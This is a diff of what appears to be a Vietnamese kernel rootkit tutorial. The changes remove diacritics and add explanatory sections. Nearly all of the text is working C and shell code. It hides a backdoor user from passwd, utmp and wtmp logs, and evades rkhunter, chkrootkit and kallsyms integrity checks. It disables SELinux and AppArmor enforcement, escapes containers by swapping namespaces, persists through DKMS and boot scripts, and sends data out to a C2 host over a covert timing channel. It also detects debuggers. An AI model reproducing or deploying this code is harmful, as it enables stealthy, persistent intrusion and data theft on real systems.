+        /* hlist_add_tail_rcu: add vao cuoi list, RCU-safe.
+         * Hooks moi active cho moi subsequent security checks. */
         hlist_add_tail_rcu(&shook->list, shook->head);
     }
 
@@ -8316,16 +12453,16 @@ static void rk_lsm_remove(void)
 ### B.1 User Hiding
 
 ```c
-/* user_hide.c — Ẩn user khỏi /etc/passwd, utmp, wtmp, lastlog
+/* user_hide.c — An user khoi /etc/passwd, utmp, wtmp, lastlog
  *
- * Khi attacker tạo backdoor user, user đó visible qua:
- *   1. /etc/passwd — `cat /etc/passwd` hoặc `getent passwd`
+ * Khi attacker tao backdoor user, user do visible qua:
+ *   1. /etc/passwd — `cat /etc/passwd` hoac `getent passwd`
  *   2. utmp (/var/run/utmp) — `who`, `w` (logged-in users)
  *   3. wtmp (/var/log/wtmp) — `last` (login history)
  *   4. lastlog (/var/log/lastlog) — `lastlog` (last login per user)
  *
- * Strategy: hook read() syscall, filter output cho files trên.
- * utmp/wtmp là BINARY format → cần parse struct utmp.
+ * Strategy: hook read() syscall, filter output cho files tren.
+ * utmp/wtmp la BINARY format -> can parse struct utmp.
  */
 
 #include "rootkit.h"
@@ -8333,12 +12470,12 @@ static void rk_lsm_remove(void)
 
 #define HIDDEN_USER "rk_user"
 
-/* ── struct utmp layout ──
+/* -- struct utmp layout --
  *
- * Defined in <utmp.h> (userspace), ta define lại cho kernel:
+ * Defined in <utmp.h> (userspace), ta define lai cho kernel:
  *
- * Mỗi entry = 384 bytes (trên x86-64).
- * utmp, wtmp dùng cùng format — chỉ khác file path.
+ * Moi entry = 384 bytes (tren x86-64).
+ * utmp, wtmp dung cung format — chi khac file path.
  */
 #define UT_NAMESIZE  32
 #define UT_LINESIZE  32
@@ -8369,13 +12506,13 @@ struct kernel_utmp {
 
 #define UTMP_ENTRY_SIZE sizeof(struct kernel_utmp)  /* 384 bytes */
 
-/* ── Filter /etc/passwd output ──
+/* -- Filter /etc/passwd output --
  *
- * /etc/passwd là text file, mỗi dòng:
+ * /etc/passwd la text file, moi dong:
  *   username:x:uid:gid:comment:home:shell
  *
- * Hook read() cho /etc/passwd, filter dòng chứa HIDDEN_USER.
- * Logic giống hooked_read cho /proc/modules (Chapter 3).
+ * Hook read() cho /etc/passwd, filter dong chua HIDDEN_USER.
+ * Logic giong hooked_read cho /proc/modules (Chapter 3).
  */
 static long filter_passwd_read(const struct pt_regs *regs,
                                 long orig_ret)
@@ -8387,7 +12524,7 @@ static long filter_passwd_read(const struct pt_regs *regs,
 
     if (orig_ret <= 0) return orig_ret;
 
-    /* Check nếu đang đọc /etc/passwd */
+    /* Check neu dang doc /etc/passwd */
     if (!is_target_file(fd, "/etc/passwd"))
         return orig_ret;
 
@@ -8400,7 +12537,7 @@ static long filter_passwd_read(const struct pt_regs *regs,
     }
     kern_buf[orig_ret] = '\0';
 
-    /* Filter: remove lines chứa HIDDEN_USER */
+    /* Filter: remove lines chua HIDDEN_USER */
     src = kern_buf;
     dst = kern_buf;
     new_ret = 0;
@@ -8410,13 +12547,13 @@ static long filter_passwd_read(const struct pt_regs *regs,
         int line_len = eol ? (eol - src + 1) : strlen(src);
 
         if (!strnstr(src, HIDDEN_USER, line_len)) {
-            /* Giữ dòng này */
+            /* Giu dong nay */
             if (dst != src)
                 memmove(dst, src, line_len);
             dst += line_len;
             new_ret += line_len;
         }
-        /* Else: skip dòng (ẩn user) */
+        /* Else: skip dong (an user) */
 
         src += line_len;
     }
@@ -8428,11 +12565,11 @@ static long filter_passwd_read(const struct pt_regs *regs,
     return new_ret;
 }
 
-/* ── Filter utmp/wtmp binary records ──
+/* -- Filter utmp/wtmp binary records --
  *
- * utmp/wtmp chứa array of struct utmp (384 bytes mỗi entry).
+ * utmp/wtmp chua array of struct utmp (384 bytes moi entry).
  * read() return N * 384 bytes.
- * Filter: remove entries có ut_user == HIDDEN_USER.
+ * Filter: remove entries co ut_user == HIDDEN_USER.
  */
 static long filter_utmp_read(const struct pt_regs *regs,
                               long orig_ret,
@@ -8469,7 +12606,7 @@ static long filter_utmp_read(const struct pt_regs *regs,
             continue;
         }
 
-        /* Visible entry — copy tới output position */
+        /* Visible entry — copy toi output position */
         if (new_ret != i * UTMP_ENTRY_SIZE)
             memmove(kern_buf + new_ret, entry, UTMP_ENTRY_SIZE);
         new_ret += UTMP_ENTRY_SIZE;
@@ -8482,9 +12619,9 @@ static long filter_utmp_read(const struct pt_regs *regs,
     return new_ret;
 }
 
-/* ── Tích hợp vào hooked_read ──
+/* -- Tich hop vao hooked_read --
  *
- * Thêm vào hooked_read() (Chapter 3):
+ * Them vao hooked_read() (Chapter 3):
  *
  * static asmlinkage long hooked_read(const struct pt_regs *regs)
  * {
@@ -8495,8 +12632,8 @@ static long filter_utmp_read(const struct pt_regs *regs,
  *     return ret;
  * }
  *
- * lastlog: dùng /var/log/lastlog, format khác (struct lastlog = 292 bytes).
- * Cần filter tương tự nhưng index by UID (record position = UID * sizeof).
+ * lastlog: dung /var/log/lastlog, format khac (struct lastlog = 292 bytes).
+ * Can filter tuong tu nhung index by UID (record position = UID * sizeof).
  */
 ```
 
@@ -8508,8 +12645,8 @@ static long filter_utmp_read(const struct pt_regs *regs,
 /* evasion.c — Evade syscall table integrity checks
  *
  * Detection tools (rkhunter, LKRG, custom scripts) verify:
- *   "Do syscall table entries point vào kernel text section?"
- *   Nếu entry trỏ ngoài [_stext, _etext] → hooked.
+ *   "Do syscall table entries point vao kernel text section?"
+ *   Neu entry tro ngoai [_stext, _etext] -> hooked.
  *
  * Evasion techniques:
  *   1. Shadow syscall table (maintain clean copy cho checks)
@@ -8522,19 +12659,19 @@ static long filter_utmp_read(const struct pt_regs *regs,
 /* ══════════════════════════════════════════════════════════════
  * Method 1: Detect-and-restore
  *
- * Khi detection tool chạy (rkhunter, chkrootkit):
+ * Khi detection tool chay (rkhunter, chkrootkit):
  *   1. Detect execution qua execve hook
  *   2. Temporarily restore original syscall entries
- *   3. Tool scan → thấy clean table → report "OK"
+ *   3. Tool scan -> thay clean table -> report "OK"
  *   4. Re-install hooks sau khi tool exit
  *
- * Detection tools thường chỉ scan 1 lần rồi exit.
- * Window chỉ cần vài giây.
+ * Detection tools thuong chi scan 1 lan roi exit.
+ * Window chi can vai giay.
  * ══════════════════════════════════════════════════════════════ */
 
 static bool evasion_active = false;
 
-/* Gọi từ execve hook (Chapter 5) khi phát hiện detection tool */
+/* Goi tu execve hook (Chapter 5) khi phat hien detection tool */
 static void rk_evade_checker(const char *tool_name)
 {
     if (evasion_active) return;
@@ -8546,9 +12683,9 @@ static void rk_evade_checker(const char *tool_name)
     rk_remove_hooks();
 
     /* Schedule re-installation sau delay.
-     * Dùng delayed workqueue:
+     * Dung delayed workqueue:
      *   schedule_delayed_work(&rehook_work, 5 * HZ);
-     *   → 5 giây sau, hooks reinstalled.
+     *   -> 5 giay sau, hooks reinstalled.
      */
 }
 
@@ -8561,7 +12698,7 @@ static void rehook_fn(struct work_struct *work)
 
 static DECLARE_DELAYED_WORK(rehook_work, rehook_fn);
 
-/* Integrate vào execve handler:
+/* Integrate vao execve handler:
  *
  * if (strstr(filename, "rkhunter") || strstr(filename, "chkrootkit"))
  *     rk_evade_checker(filename);
@@ -8572,24 +12709,24 @@ static DECLARE_DELAYED_WORK(rehook_work, rehook_fn);
  * Method 2: Shadow read of /proc/kallsyms
  *
  * Detection scripts compare syscall table entries vs kallsyms.
- * Hook read() on /proc/kallsyms → return ORIGINAL addresses
+ * Hook read() on /proc/kallsyms -> return ORIGINAL addresses
  * cho hooked syscalls.
  *
- * Script thấy: sys_getdents64 = 0xffffffff81234000
+ * Script thay: sys_getdents64 = 0xffffffff81234000
  * Syscall table[getdents64] = 0xffffffff81234000 (original)
- * → "Match! Table clean."
+ * -> "Match! Table clean."
  *
- * Thực tế: syscall table[getdents64] = 0xffffffffc0a00000 (hook)
- * Nhưng read hook return fake address cho /proc/kallsyms.
+ * Thuc te: syscall table[getdents64] = 0xffffffffc0a00000 (hook)
+ * Nhung read hook return fake address cho /proc/kallsyms.
  * ══════════════════════════════════════════════════════════════ */
 
-/* Giống filter_passwd_read nhưng cho /proc/kallsyms:
- * Replace hook address strings với original address strings.
- * Tích hợp vào hooked_read() Chapter 3.
+/* Giong filter_passwd_read nhung cho /proc/kallsyms:
+ * Replace hook address strings voi original address strings.
+ * Tich hop vao hooked_read() Chapter 3.
  *
- * Dùng %016lx cho raw hex address strings.
- * Không dùng %pK vì kptr_restrict > 0 sẽ in "0000000000000000"
- * hoặc "(____ptrval____)". */
+ * Dung %016lx cho raw hex address strings.
+ * Khong dung %pK vi kptr_restrict > 0 se in "0000000000000000"
+ * hoac "(____ptrval____)". */
     snprintf(hook_hex, sizeof(hook_hex), "%016lx",
              shadow_table[i].hook_addr);
     snprintf(orig_hex, sizeof(orig_hex), "%016lx",
@@ -8598,12 +12735,12 @@ static DECLARE_DELAYED_WORK(rehook_work, rehook_fn);
 /* ══════════════════════════════════════════════════════════════
  * Method 3: Watchdog — Verify module stays hidden
  *
- * Periodically check nếu rootkit module vẫn hidden trong
- * modules list. Nếu bị expose lại → re-hide.
+ * Periodically check neu rootkit module van hidden trong
+ * modules list. Neu bi expose lai -> re-hide.
  *
- * Dùng global "modules" list head thay vì THIS_MODULE.
+ * Dung global "modules" list head thay vi THIS_MODULE.
  * list_for_each_entry(pos, &THIS_MODULE->list, list)
- * KHÔNG BAO GIỜ visit THIS_MODULE (nó là sentinel).
+ * KHONG BAO GIO visit THIS_MODULE (no la sentinel).
  * ══════════════════════════════════════════════════════════════ */
     struct list_head *modules_head;
     struct module *mod;
@@ -8613,7 +12750,7 @@ static DECLARE_DELAYED_WORK(rehook_work, rehook_fn);
 
     list_for_each_entry(mod, modules_head, list) {
         if (strcmp(mod->name, MODULE_NAME_STR) == 0) {
-            /* Module visible trong list → re-hide */
+            /* Module visible trong list -> re-hide */
             rk_hide_module();
             break;
         }
@@ -8627,17 +12764,27 @@ skip_check2:
 
 ### C.1 SELinux/AppArmor Bypass
 
+**Deep Kernel Internals: SELinux va MAC Enforcement**
+
+SELinux implement Mandatory Access Control (MAC) — lop access control BEN TREN Unix DAC (rwx permissions). Ngay ca root (UID 0) cung bi SELinux restrict neu policy khong cho phep.
+
+Core mechanism: bien `selinux_enforcing` (global int). Gia tri 0 = permissive mode (chi log, khong block), 1 = enforcing mode (block violations). Rootkit chi can set `selinux_enforcing = 0` de vo hieu hoa toan bo SELinux enforcement.
+
+Moi task co security context luu trong credential blob: `task->cred->security` tro toi SELinux context data (bao gom domain type, role, user). Neu set `cred->security = NULL`, nhieu SELinux check functions se early-return "allowed" vi khong co context de evaluate. Cach an toan hon: copy security blob tu `init_cred` (credentials cua PID 1, thuong la `unconfined_t` domain) de ke thua quyen unconfined.
+
+AppArmor tuong tu nhung dung path-based policy thay vi label-based — moi file duoc identify theo pathname thay vi security label tren inode. AppArmor cung luu profile trong `cred->security`, va ky thuat bypass tuong tu.
+
 ```c
 /* selinux_bypass.c — Bypass Mandatory Access Control
  *
- * SELinux enforce access control NGOÀI Unix DAC (rwx permissions).
- * Ngay cả root cũng bị SELinux restrict.
+ * SELinux enforce access control NGOAI Unix DAC (rwx permissions).
+ * Ngay ca root cung bi SELinux restrict.
  *
  * Kernel-level bypass methods:
  *   1. Disable SELinux enforce mode
  *   2. Null security blob trong credentials
- *   3. Set process context thành unconfined
- *   4. Modify selinux_enforcing variable trực tiếp
+ *   3. Set process context thanh unconfined
+ *   4. Modify selinux_enforcing variable truc tiep
  */
 
 #include "rootkit.h"
@@ -8649,7 +12796,7 @@ skip_check2:
  *   1 = enforcing (block violations)
  *   0 = permissive (log only, don't block)
  *
- * Equivalent: setenforce 0 (nhưng từ kernel, không cần selinux tools).
+ * Equivalent: setenforce 0 (nhung tu kernel, khong can selinux tools).
  * ══════════════════════════════════════════════════════════════ */
 static void rk_selinux_disable(void)
 {
@@ -8663,8 +12810,8 @@ static void rk_selinux_disable(void)
 
     /* Alternative: selinux_state structure (kernel 5.x+)
      *
-     * struct selinux_state có field .enforcing.
-     * Nếu selinux_enforcing không tồn tại (newer kernels):
+     * struct selinux_state co field .enforcing.
+     * Neu selinux_enforcing khong ton tai (newer kernels):
      */
     void *state = (void *)rk_lookup_name("selinux_state");
     if (state) {
@@ -8682,13 +12829,13 @@ static void rk_selinux_disable(void)
 /* ══════════════════════════════════════════════════════════════
  * Method 2: Null credential security blob
  *
- * Mỗi struct cred có `void *security` field.
- * LSM (SELinux/AppArmor) stores context info tại đây.
+ * Moi struct cred co `void *security` field.
+ * LSM (SELinux/AppArmor) stores context info tai day.
  *
- * Nếu security = NULL → LSM checks trả về "allowed"
- * (nhiều SELinux check functions early-return khi NULL).
+ * Neu security = NULL -> LSM checks tra ve "allowed"
+ * (nhieu SELinux check functions early-return khi NULL).
  *
- * Hoặc: copy security blob từ init_cred (PID 1, unconfined).
+ * Hoac: copy security blob tu init_cred (PID 1, unconfined).
  * ══════════════════════════════════════════════════════════════ */
 static void rk_bypass_lsm_for_current(void)
 {
@@ -8701,7 +12848,7 @@ static void rk_bypass_lsm_for_current(void)
     cred = (struct cred *)current->cred;
 
     if (init_cred_ptr && init_cred_ptr->security) {
-        /* Copy init_cred's security blob → current gets unconfined context */
+        /* Copy init_cred's security blob -> current gets unconfined context */
         cred->security = init_cred_ptr->security;
     } else {
         /* Fallback: NULL security blob */
@@ -8713,17 +12860,17 @@ static void rk_bypass_lsm_for_current(void)
  * Method 3: AppArmor bypass
  *
  * AppArmor stores profile info trong task->security.
- * Mỗi profile define allowed operations.
+ * Moi profile define allowed operations.
  *
  * "unconfined" profile = no restrictions.
- * Set current task's AppArmor profile → unconfined.
+ * Set current task's AppArmor profile -> unconfined.
  * ══════════════════════════════════════════════════════════════ */
 static void rk_apparmor_bypass(void)
 {
     /* AppArmor uses cred->security to store aa_label.
      * aa_label contains current profile.
      *
-     * Approach: set cred->security tới unconfined label.
+     * Approach: set cred->security toi unconfined label.
      * unconfined label = root_ns->unconfined trong AppArmor. */
     rk_bypass_lsm_for_current();
 }
@@ -8733,24 +12880,44 @@ static void rk_apparmor_bypass(void)
 
 ### C.2 Namespace Escape
 
+**Deep Kernel Internals: Linux Namespaces va Container Isolation**
+
+Moi process co `struct nsproxy` chua pointers toi tat ca namespaces cua no:
+
+```
+struct nsproxy {
+    struct uts_namespace  *uts_ns;             // hostname, domainname
+    struct ipc_namespace  *ipc_ns;             // System V IPC, POSIX message queues
+    struct mnt_namespace  *mnt_ns;             // mount points (filesystem view)
+    struct pid_namespace  *pid_ns_for_children; // PID number space
+    struct net            *net_ns;             // network stack (interfaces, routes, iptables)
+    struct time_namespace *time_ns;            // clock offsets (kernel 5.6+)
+    struct cgroup_namespace *cgroup_ns;        // cgroup root view
+};
+```
+
+Container (Docker, LXC, Podman) = process co nsproxy tro toi cac **isolated namespace instances** thay vi host namespaces. Vi du, container process co `mnt_ns` rieng chi thay filesystem cua container, `pid_ns` rieng chi thay PIDs trong container.
+
+Container escape tu kernel: swap `current->nsproxy` voi `init_nsproxy` (nsproxy cua PID 1 — host system). Dong thoi swap `current->fs->root` voi init's root de thoat khoi chroot cua container. Sau khi swap, process trong container co the thay toan bo host filesystem va network.
+
 ```c
 /* namespace_escape.c — Escape Linux namespaces (container breakout)
  *
  * Containers (Docker, LXC, Podman) = process isolation via namespaces:
- *   PID namespace:    process chỉ thấy PIDs trong cùng namespace
+ *   PID namespace:    process chi thay PIDs trong cung namespace
  *   NET namespace:    isolated network stack
  *   MNT namespace:    isolated filesystem mounts
  *   UTS namespace:    isolated hostname
  *   USER namespace:   UID/GID mapping
  *   IPC namespace:    isolated IPC objects
  *
- * Container breakout từ kernel: switch sang init namespace
- * (namespace của host system PID 1).
+ * Container breakout tu kernel: switch sang init namespace
+ * (namespace cua host system PID 1).
  *
- * Khi rootkit module load TRONG container (cần CAP_SYS_MODULE):
- *   → Module chạy trong kernel space = shared bởi tất cả containers
- *   → Nhưng current task thuộc container namespace
- *   → Switch namespace → escape container isolation
+ * Khi rootkit module load TRONG container (can CAP_SYS_MODULE):
+ *   -> Module chay trong kernel space = shared boi tat ca containers
+ *   -> Nhung current task thuoc container namespace
+ *   -> Switch namespace -> escape container isolation
  */
 
 #include "rootkit.h"
@@ -8759,9 +12926,9 @@ static void rk_apparmor_bypass(void)
 #include <linux/fs_struct.h>   /* task_struct->fs */
 #include <linux/mount.h>
 
-/* ── Switch process vào init namespace ──
+/* -- Switch process vao init namespace --
  *
- * Mỗi process có nsproxy struct chứa pointers tới tất cả namespaces:
+ * Moi process co nsproxy struct chua pointers toi tat ca namespaces:
  *   struct nsproxy {
  *       struct uts_namespace  *uts_ns;
  *       struct ipc_namespace  *ipc_ns;
@@ -8771,8 +12938,8 @@ static void rk_apparmor_bypass(void)
  *       struct cgroup_namespace *cgroup_ns;
  *   };
  *
- * init_nsproxy = nsproxy của PID 1 (host system).
- * Switch current->nsproxy → init_nsproxy = escape container.
+ * init_nsproxy = nsproxy cua PID 1 (host system).
+ * Switch current->nsproxy -> init_nsproxy = escape container.
  */
 static void rk_escape_namespaces(void)
 {
@@ -8780,7 +12947,7 @@ static void rk_escape_namespaces(void)
     struct fs_struct *init_fs, *cur_fs;
     struct path old_root, old_pwd;
 
-    /* Lấy init_nsproxy và init_fs — namespace set và fs_struct của host */
+    /* Lay init_nsproxy va init_fs — namespace set va fs_struct cua host */
     init_nsp = (struct nsproxy *)rk_lookup_name("init_nsproxy");
     init_fs = (struct fs_struct *)rk_lookup_name("init_fs");
     if (!init_nsp || !init_fs) {
@@ -8790,8 +12957,8 @@ static void rk_escape_namespaces(void)
 
     /* Swap nsproxy with proper locking.
      *
-     * task_lock(current) phải acquire trước khi modify current->nsproxy.
-     * Tránh race condition với signal delivery và other nsproxy readers.
+     * task_lock(current) phai acquire truoc khi modify current->nsproxy.
+     * Tranh race condition voi signal delivery va other nsproxy readers.
      */
     task_lock(current);
     {
@@ -8803,18 +12970,18 @@ static void rk_escape_namespaces(void)
     task_unlock(current);
     pr_info("rk: escaped to init namespaces\n");
 
-    /* Switch filesystem root — container có chroot vào /container/root.
-     * Phải switch fs->root tới host root để thấy full filesystem.
+    /* Switch filesystem root — container co chroot vao /container/root.
+     * Phai switch fs->root toi host root de thay full filesystem.
      *
      * init_task->fs->root = host root filesystem.
      *
-     * QUAN TRỌNG: phải path_put() trên old values SAU khi set new values.
-     * Không path_put → dentry/vfsmount leak (reference count never decremented).
+     * QUAN TRONG: phai path_put() tren old values SAU khi set new values.
+     * Khong path_put -> dentry/vfsmount leak (reference count never decremented).
      */
     cur_fs = current->fs;
     spin_lock(&cur_fs->lock);
 
-    /* Save old paths trước khi overwrite */
+    /* Save old paths truoc khi overwrite */
     old_root = cur_fs->root;
     old_pwd = cur_fs->pwd;
 
@@ -8844,16 +13011,16 @@ static void rk_escape_namespaces(void)
 /* dkms_persist.c — DKMS auto-rebuild across kernel upgrades
  *
  * DKMS (Dynamic Kernel Module Support):
- *   - Framework tự động rebuild kernel module khi kernel update
- *   - Dùng bởi NVIDIA drivers, VirtualBox, ZFS
- *   - Module source ở /usr/src/MODULE-VERSION/
+ *   - Framework tu dong rebuild kernel module khi kernel update
+ *   - Dung boi NVIDIA drivers, VirtualBox, ZFS
+ *   - Module source o /usr/src/MODULE-VERSION/
  *   - dkms.conf define build instructions
- *   - apt/dnf kernel upgrade trigger → DKMS rebuild all registered modules
+ *   - apt/dnf kernel upgrade trigger -> DKMS rebuild all registered modules
  *
- * Vì sao DKMS quan trọng cho persistence:
- *   Tất cả persistence methods khác dùng .ko file compiled cho
- *   SPECIFIC kernel version. Kernel upgrade → .ko incompatible → rootkit die.
- *   DKMS TỰ ĐỘNG recompile → survive kernel upgrade.
+ * Vi sao DKMS quan trong cho persistence:
+ *   Tat ca persistence methods khac dung .ko file compiled cho
+ *   SPECIFIC kernel version. Kernel upgrade -> .ko incompatible -> rootkit die.
+ *   DKMS TU DONG recompile -> survive kernel upgrade.
  */
 
 #include "rootkit.h"
@@ -8865,13 +13032,13 @@ static void persist_dkms(const char *module_name,
     char cmd[4096];
 
     snprintf(cmd, sizeof(cmd),
-        /* 1. Tạo DKMS source directory */
+        /* 1. Tao DKMS source directory */
         "mkdir -p /usr/src/%s-1.0; "
 
-        /* 2. Copy source files vào DKMS directory */
+        /* 2. Copy source files vao DKMS directory */
         "cp %s/*.c %s/*.h %s/Makefile /usr/src/%s-1.0/ 2>/dev/null; "
 
-        /* 3. Tạo dkms.conf */
+        /* 3. Tao dkms.conf */
         "cat > /usr/src/%s-1.0/dkms.conf << 'DKMSEOF'\n"
         "PACKAGE_NAME=\"%s\"\n"
         "PACKAGE_VERSION=\"1.0\"\n"
@@ -8884,7 +13051,7 @@ static void persist_dkms(const char *module_name,
         "M=${dkms_tree}/${PACKAGE_NAME}/${PACKAGE_VERSION}/build clean\"\n"
         "DKMSEOF\n"
 
-        /* 4. Add module tới DKMS */
+        /* 4. Add module toi DKMS */
         "dkms add -m %s -v 1.0 2>/dev/null; "
 
         /* 5. Build cho current kernel */
@@ -8919,31 +13086,31 @@ static void persist_dkms(const char *module_name,
 ```c
 /* boot_script.c — Legacy boot script persistence
  *
- * Cho hệ thống KHÔNG dùng systemd (hoặc dùng kết hợp).
+ * Cho he thong KHONG dung systemd (hoac dung ket hop).
  */
 
 #include "rootkit.h"
 #include <linux/kmod.h>
 
-/* ── Method 1: /etc/rc.local ──
- * Legacy phương pháp, vẫn hoạt động trên nhiều distros.
- * rc.local chạy scripts cuối cùng trong boot sequence.
+/* -- Method 1: /etc/rc.local --
+ * Legacy phuong phap, van hoat dong tren nhieu distros.
+ * rc.local chay scripts cuoi cung trong boot sequence.
  */
 static void persist_rc_local(const char *module_name)
 {
     char cmd[512];
 
     snprintf(cmd, sizeof(cmd),
-        /* Tạo rc.local nếu chưa có (một số distro mới không có sẵn) */
+        /* Tao rc.local neu chua co (mot so distro moi khong co san) */
         "touch /etc/rc.local; "
         "chmod +x /etc/rc.local; "
-        /* Thêm shebang nếu chưa có */
+        /* Them shebang neu chua co */
         "head -1 /etc/rc.local | grep -q '^#!/' || "
         "sed -i '1i #!/bin/bash' /etc/rc.local; "
-        /* Thêm modprobe command TRƯỚC 'exit 0' (nếu có) */
+        /* Them modprobe command TRUOC 'exit 0' (neu co) */
         "grep -q 'modprobe %s' /etc/rc.local || "
         "sed -i '/^exit 0/i /sbin/modprobe %s' /etc/rc.local; "
-        /* Nếu không có 'exit 0': append */
+        /* Neu khong co 'exit 0': append */
         "grep -q 'modprobe %s' /etc/rc.local || "
         "echo '/sbin/modprobe %s' >> /etc/rc.local",
         module_name, module_name, module_name, module_name);
@@ -8953,7 +13120,7 @@ static void persist_rc_local(const char *module_name)
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
 
-/* ── Method 2: SysV init script ── */
+/* -- Method 2: SysV init script -- */
 static void persist_sysv_init(const char *module_name)
 {
     char cmd[2048];
@@ -8996,24 +13163,24 @@ static void persist_sysv_init(const char *module_name)
 ```c
 /* timing_channel.c — Covert timing channel
  *
- * Encode data KHÔNG trong packet content mà trong THỜI GIAN
- * giữa các packets.
+ * Encode data KHONG trong packet content ma trong THOI GIAN
+ * giua cac packets.
  *
  * Concept:
- *   Bit 1: delay 100ms rồi send packet
- *   Bit 0: delay 50ms rồi send packet
- *   Receiver measure inter-packet timing → decode bits.
+ *   Bit 1: delay 100ms roi send packet
+ *   Bit 0: delay 50ms roi send packet
+ *   Receiver measure inter-packet timing -> decode bits.
  *
- * Ưu điểm:
- *   - Packet content hoàn toàn bình thường (ICMP ping, HTTP, DNS)
- *   - Deep packet inspection KHÔNG phát hiện (content clean)
- *   - Chỉ timing analysis mới detect được
- *   - Bandwidth thấp nhưng stealth cực cao
+ * Uu diem:
+ *   - Packet content hoan toan binh thuong (ICMP ping, HTTP, DNS)
+ *   - Deep packet inspection KHONG phat hien (content clean)
+ *   - Chi timing analysis moi detect duoc
+ *   - Bandwidth thap nhung stealth cuc cao
  *
- * Nhược điểm:
- *   - Bandwidth rất thấp (~10 bits/second)
- *   - Network jitter gây noise → cần error correction
- *   - Cần synchronized clock hoặc preamble
+ * Nhuoc diem:
+ *   - Bandwidth rat thap (~10 bits/second)
+ *   - Network jitter gay noise -> can error correction
+ *   - Can synchronized clock hoac preamble
  */
 
 #include "rootkit.h"
@@ -9024,7 +13191,7 @@ static void persist_sysv_init(const char *module_name)
 #define TIMING_BIT_0_MS   50   /* Delay cho bit 0 */
 #define TIMING_SYNC_MS   200   /* Sync pulse (start of byte) */
 
-/* ── Send single bit qua timing ── */
+/* -- Send single bit qua timing -- */
 static int timing_send_bit(struct socket *sock,
                             struct sockaddr_in *dest,
                             int bit)
@@ -9032,7 +13199,7 @@ static int timing_send_bit(struct socket *sock,
     /* Delay = encode bit value */
     msleep(bit ? TIMING_BIT_1_MS : TIMING_BIT_0_MS);
 
-    /* Send innocuous packet (ICMP ping hoặc DNS query) */
+    /* Send innocuous packet (ICMP ping hoac DNS query) */
     char payload[] = "AAAA";
     struct msghdr msg = { 0 };
     struct kvec iov = { .iov_base = payload, .iov_len = 4 };
@@ -9042,7 +13209,7 @@ static int timing_send_bit(struct socket *sock,
     return kernel_sendmsg(sock, &msg, &iov, 1, 4);
 }
 
-/* ── Send byte (8 bits) qua timing channel ── */
+/* -- Send byte (8 bits) qua timing channel -- */
 static int timing_send_byte(struct socket *sock,
                               struct sockaddr_in *dest,
                               unsigned char byte)
@@ -9050,7 +13217,7 @@ static int timing_send_byte(struct socket *sock,
     int i;
 
     /* Sync pulse: longer delay signals start of byte.
-     * Receiver calibrate timing từ sync pulse. */
+     * Receiver calibrate timing tu sync pulse. */
     msleep(TIMING_SYNC_MS);
 
     /* MSB first */
@@ -9062,7 +13229,7 @@ static int timing_send_byte(struct socket *sock,
     return 0;
 }
 
-/* ── Exfiltrate data qua timing channel ── */
+/* -- Exfiltrate data qua timing channel -- */
 static int rk_timing_exfil(__be32 c2_ip, __be16 c2_port,
                              const void *data, int data_len)
 {
@@ -9089,7 +13256,7 @@ static int rk_timing_exfil(__be32 c2_ip, __be16 c2_port,
         timing_send_byte(sock, &dest, bytes[i]);
 
         /* Yield CPU periodically — prevent soft lockup warning.
-         * schedule() cho phép kernel chạy other tasks. */
+         * schedule() cho phep kernel chay other tasks. */
         if (i % 10 == 0)
             schedule();
     }
@@ -9106,11 +13273,11 @@ static int rk_timing_exfil(__be32 c2_ip, __be16 c2_port,
 ### F.1 Code Integrity Self-Check
 
 ```c
-/* code_integrity.c — Rootkit tự kiểm tra code integrity
+/* code_integrity.c — Rootkit tu kiem tra code integrity
  *
- * Detect nếu analyst hoặc tool đã patch/modify rootkit code:
- *   - Breakpoint (0xCC INT3) inject bởi debugger
- *   - Byte modification bởi LKRG hoặc manual patching
+ * Detect neu analyst hoac tool da patch/modify rootkit code:
+ *   - Breakpoint (0xCC INT3) inject boi debugger
+ *   - Byte modification boi LKRG hoac manual patching
  *   - Function redirection (hook on our hooks)
  *
  * Method: hash rootkit code pages, periodically verify.
@@ -9125,7 +13292,7 @@ static int rk_timing_exfil(__be32 c2_ip, __be16 c2_port,
 static u8 code_hash_saved[HASH_SIZE];
 static bool hash_initialized = false;
 
-/* ── Compute SHA-256 hash of module code section ── */
+/* -- Compute SHA-256 hash of module code section -- */
 static int compute_module_hash(u8 *hash_out)
 {
     struct crypto_shash *tfm;
@@ -9138,7 +13305,7 @@ static int compute_module_hash(u8 *hash_out)
      *   THIS_MODULE->core_layout.base = start of module memory
      *   THIS_MODULE->core_layout.text_size = size of code (.text) section
      *
-     * Chỉ hash code section (không hash data — data thay đổi bình thường). */
+     * Chi hash code section (khong hash data — data thay doi binh thuong). */
     code_start = THIS_MODULE->core_layout.base;
     code_size  = THIS_MODULE->core_layout.text_size;
 
@@ -9169,7 +13336,7 @@ out:
     return ret;
 }
 
-/* ── Initialize: save hash ngay sau module load ── */
+/* -- Initialize: save hash ngay sau module load -- */
 int rk_integrity_init(void)
 {
     int ret = compute_module_hash(code_hash_saved);
@@ -9178,10 +13345,10 @@ int rk_integrity_init(void)
     return ret;
 }
 
-/* ── Verify: so sánh hash hiện tại với saved ──
+/* -- Verify: so sanh hash hien tai voi saved --
  *
- * Gọi periodically từ watchdog thread.
- * Nếu mismatch → code đã bị tamper.
+ * Goi periodically tu watchdog thread.
+ * Neu mismatch -> code da bi tamper.
  */
 bool rk_integrity_check(void)
 {
@@ -9193,13 +13360,13 @@ bool rk_integrity_check(void)
 
     ret = compute_module_hash(current_hash);
     if (ret)
-        return true;  /* Hash fail → assume OK (crash prevention) */
+        return true;  /* Hash fail -> assume OK (crash prevention) */
 
     if (memcmp(current_hash, code_hash_saved, HASH_SIZE) != 0) {
         pr_err("rk: CODE INTEGRITY VIOLATION DETECTED\n");
 
         /* Response options:
-         * 1. Re-patch: restore original code từ backup
+         * 1. Re-patch: restore original code tu backup
          * 2. Self-destruct: remove traces and unload
          * 3. Alert: notify C2 server
          * 4. Evade: change behavior (go silent)
@@ -9210,7 +13377,7 @@ bool rk_integrity_check(void)
     return true;  /* Integrity OK */
 }
 
-/* ── Scan for breakpoints (0xCC INT3) trong code section ── */
+/* -- Scan for breakpoints (0xCC INT3) trong code section -- */
 bool rk_detect_breakpoints(void)
 {
     unsigned char *code = THIS_MODULE->core_layout.base;
@@ -9221,8 +13388,8 @@ bool rk_detect_breakpoints(void)
     for (i = 0; i < size; i++) {
         if (code[i] == 0xCC) {
             bp_count++;
-            /* 0xCC có thể là legitimate instruction (aligned nop)
-             * nhưng nhiều 0xCC = debugger breakpoints. */
+            /* 0xCC co the la legitimate instruction (aligned nop)
+             * nhung nhieu 0xCC = debugger breakpoints. */
         }
     }
 
